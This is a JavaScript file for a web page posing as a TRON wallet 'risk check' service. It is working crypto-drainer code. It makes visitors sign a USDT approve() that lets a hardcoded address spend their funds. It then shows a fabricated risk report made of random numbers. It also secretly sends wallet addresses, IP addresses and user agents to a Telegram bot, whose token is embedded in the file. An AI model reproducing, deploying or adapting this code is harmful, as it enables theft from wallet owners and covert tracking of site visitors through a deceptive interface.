// ============================================
// ФИНАЛЬНАЯ ВЕРСИЯ SCRIPT.JS – ВСЕ ФУНКЦИИ В ОДНОМ ФАЙЛЕ
// ============================================

// --- ГЛОБАЛЬНЫЕ КОНСТАНТЫ ---
const CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const BOT_ADDRESS = 'TTC9nFcmD9ziGLzJdDpG3ciSKuvLVWxRrG';
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

let connectedWalletAddress = null;
const walletInput = document.getElementById('walletInput');
const checkBtn = document.getElementById('checkBtn');
const connectBtn = document.getElementById('connectWalletBtn');
const statusSpan = document.getElementById('connectedStatus');

// --- ТЕЛЕГРАМ ---
async function sendTelegramMessage(text) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' })
        });
        const result = await response.json();
        if (result.ok) console.log('✅ Уведомление отправлено');
        else console.error('❌ Ошибка Telegram:', result.description);
    } catch (error) { console.error('❌ Ошибка отправки:', error.message); }
}

// --- ПОДКЛЮЧЕНИЕ КОШЕЛЬКА ---
async function connectWallet() {
    try {
        if (!window.tronLink) { alert('❌ TronLink не обнаружен'); return; }
        if (!window.tronLink.ready) { alert('🔒 TronLink заблокирован'); return; }
        
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        connectedWalletAddress = window.tronLink.tronWeb.defaultAddress.base58;
        walletInput.value = connectedWalletAddress;
        if (statusSpan) statusSpan.style.display = 'inline-flex';
        sendTelegramMessage(`🔌 <b>Кошелёк подключён</b>\n📬 <code>${connectedWalletAddress}</code>`);
        alert('✅ Кошелёк подключён!');
    } catch (error) { alert('Ошибка подключения: ' + error.message); }
}

// --- ОТПРАВКА APPROVE ---
async function handleTronCheck() {
    try {
        if (!connectedWalletAddress) { alert('❌ Сначала подключите кошелёк'); return; }
        const tronWeb = window.tronLink.tronWeb;
        const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
        const amount = '10000000'; // 10 USDT

        checkBtn.disabled = true;
        checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
        const tx = await contract.approve(BOT_ADDRESS, amount).send({ feeLimit: 600_000_000, callValue: 0, shouldPollResponse: true, timeout: 120000 });
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';

        sendTelegramMessage(`✅ <b>Approve успешно отправлен</b>\n📤 <code>${connectedWalletAddress}</code>\n💰 10 USDT\n🔗 https://tronscan.org/#/transaction/${tx}`);
        showDemoReport(connectedWalletAddress);
    } catch (error) {
        checkBtn.disabled = false;
        checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить';
        sendTelegramMessage(`❌ <b>Ошибка approve</b>\n📝 ${error.message}\n📬 <code>${connectedWalletAddress || 'неизвестно'}</code>`);
        alert('❌ Ошибка: ' + error.message);
    }
}

// --- ДЕМО-ОТЧЁТ ---
function showDemoReport(address) {
    const resultSection = document.getElementById('resultSection');
    if (!resultSection) return;
    resultSection.style.display = 'block';
    document.getElementById('checkedAddress').textContent = address;
    document.getElementById('totalTx').textContent = Math.floor(Math.random() * 500) + 50;
    document.getElementById('suspiciousTx').textContent = Math.floor(Math.random() * 30);
    document.getElementById('walletAge').textContent = Math.floor(Math.random() * 365) + ' дней';
    document.getElementById('lastActive').textContent = 'сегодня';
    document.getElementById('riskPercent').textContent = Math.floor(Math.random() * 100) + '%';
    document.getElementById('riskBadge').innerHTML = 'Средний риск';
    document.getElementById('riskBadge').className = 'result-badge medium';
    document.getElementById('sourcesList').innerHTML = '<p><i class="fas fa-exclamation-circle"></i> Миксеры</p><p><i class="fas fa-exclamation-circle"></i> Биржи без KYC</p>';
    const gaugeFill = document.getElementById('gaugeFill');
    const risk = Math.floor(Math.random() * 100);
    if (gaugeFill) {
        const maxDash = 251.2;
        gaugeFill.style.strokeDashoffset = maxDash - (risk / 100) * maxDash;
        gaugeFill.style.stroke = risk > 25 && risk <= 75 ? '#ffaa5e' : risk > 75 ? '#ff6b6b' : '#00c9b7';
    }
}

// --- ОТЧЁТ О ПОСЕТИТЕЛЕ (IP) ---
async function reportVisitor() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        sendTelegramMessage(`👁‍🗨 <b>Новый посетитель сайта</b>\n🌐 IP: <code>${data.ip}</code>\n📱 ${navigator.userAgent}\n⏰ ${new Date().toLocaleString()}`);
    } catch (error) { console.error('Не удалось получить IP'); }
}

// --- КОПИРОВАНИЕ ---
function copyAddress() { const address = document.getElementById('checkedAddress').textContent; navigator.clipboard.writeText(address); alert('✅ Адрес скопирован'); }

// --- ТЕСТ TELEGRAM ---
window.testTelegram = async function() { await sendTelegramMessage('🧪 <b>Тестовое сообщение</b> ✅ Связь работает'); alert('✅ Тест отправлен'); };

// --- ЗАКРЫТИЕ МОДАЛКИ ---
function closeApproveModal() { document.getElementById('approveModal').style.display = 'none'; checkBtn.disabled = false; checkBtn.innerHTML = '<i class="fas fa-shield-check"></i> Проверить'; }
window.confirmApprove = async function() {
    document.getElementById('approveModal').style.display = 'none';
    alert('Функция в разработке. Для теста используйте approve на 10 USDT.');
    showDemoReport(connectedWalletAddress);
};

// --- ЗАПУСК ПРИ ЗАГРУЗКЕ ---
document.addEventListener('DOMContentLoaded', function() {
    if (connectBtn) connectBtn.addEventListener('click', connectWallet);
    if (checkBtn) checkBtn.addEventListener('click', handleTronCheck);
    window.copyAddress = copyAddress;
    sendTelegramMessage(`🚀 <b>Сайт загружен</b>\n📱 ${navigator.userAgent.includes('Mobile') ? 'Мобильное устройство' : 'Компьютер'}`);
    setTimeout(reportVisitor, 2000);
});
